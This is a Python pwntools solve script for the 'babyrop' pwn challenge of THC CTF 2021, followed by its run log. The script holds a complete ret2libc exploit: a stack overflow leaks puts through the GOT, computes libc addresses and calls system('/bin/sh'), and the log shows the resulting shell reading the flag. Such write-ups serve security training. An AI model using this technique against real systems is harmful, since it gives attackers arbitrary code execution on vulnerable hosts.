from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './babyrop'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "remote1.thcon.party"
  PORT = 10900
  s = remote(HOST, PORT)
  #libc = ELF("./libc-2.23.so")
  libc = elf.libc
else:
  s = process(BINARY)
  libc = elf.libc

pop_rdi_ret = 0x4012c3 # pop rdi; ret;
puts_plt    = 0x401030

s.recvuntil("What's your name ?\n")

buf  = "A"*40
buf += p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(puts_plt)
buf += p64(elf.sym.main)
s.sendline(buf)

r = s.recvuntil("\n")[:-1]
puts_addr   = u64(r + "\x00\x00")
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search('/bin/sh'))

print "puts_addr   =", hex(puts_addr)
print "libc_base   =", hex(libc_base)
print "system_addr =", hex(system_addr)
print "binsh_addr  =", hex(binsh_addr)

s.recvuntil("What's your name ?\n")

buf  = "A"*40
buf += p64(pop_rdi_ret+1)
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/THC_CTF_2021/Pwn_Babyrop_100$ python solve.py r
[*] '/home/mito/CTF/THC_CTF_2021/Pwn_Babyrop_100/babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to remote1.thcon.party on port 10900: Done
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
puts_addr   = 0x7f2836b7daa0
libc_base   = 0x7f2836afd000
system_addr = 0x7f2836b4c550
binsh_addr  = 0x7f2836cb0e1a
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 124
-rwxr-xr-x 1 root root  16984 Jun  8 20:45 babyrop
-rw------- 1 user user 245760 Jun 12 08:50 core
-rw-r--r-- 1 root root     39 Jun  8 20:45 flag.txt
$ cat flag.txt
THCon21{4Ll_0f_Th47_t0_c0ntR0L-RDx?!??}
'''
